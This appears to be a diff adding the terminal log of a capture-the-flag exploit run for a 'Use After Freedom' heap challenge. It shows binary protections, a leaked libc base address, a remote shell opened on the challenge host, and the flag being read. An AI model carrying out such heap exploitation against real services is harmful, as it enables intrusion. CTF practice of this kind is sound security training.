@@ -1,0 +1,43 @@
+mito@ubuntu:~/CTF/HSCTF_8/Pwn_Use_After_Freedom$ python3 solve.py r
+[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to use-after-freedom.hsc.tf on port 1337: Done
+[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+libc_leak = 0x7f69d1731ca0
+libc_base = 0x7f69d1346000
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 76
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:09 bin
+drwxr-xr-x   2 nobody nogroup 4096 Apr 24  2018 boot
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:09 dev
+drwxr-xr-x  29 nobody nogroup 4096 Jun 12 18:41 etc
+-rw-rw-r--   1 nobody nogroup   51 Jun 12 19:38 flag
+drwxr-xr-x   3 nobody nogroup 4096 Jun 12 19:43 home
+drwxr-xr-x   8 nobody nogroup 4096 May 23  2017 lib
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:08 lib64
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:05 media
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:05 mnt
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:05 opt
+dr-xr-xr-x 203 nobody nogroup    0 Jun 22 00:43 proc
+drwx------   2 nobody nogroup 4096 May 12 23:09 root
+drwxr-xr-x   5 nobody nogroup 4096 May 19 19:44 run
+drwxr-xr-x   2 nobody nogroup 4096 May 19 19:44 sbin
+drwxr-xr-x   2 nobody nogroup 4096 May 12 23:05 srv
+drwxr-xr-x   2 nobody nogroup 4096 Apr 24  2018 sys
+drwxrwxrwt   2 nobody nogroup 4096 May 12 23:09 tmp
+drwxr-xr-x  10 nobody nogroup 4096 May 12 23:05 usr
+drwxr-xr-x  11 nobody nogroup 4096 May 12 23:09 var
+$ cat flag
+flag{ok_but_why_is_global_max_fast_even_writeable}
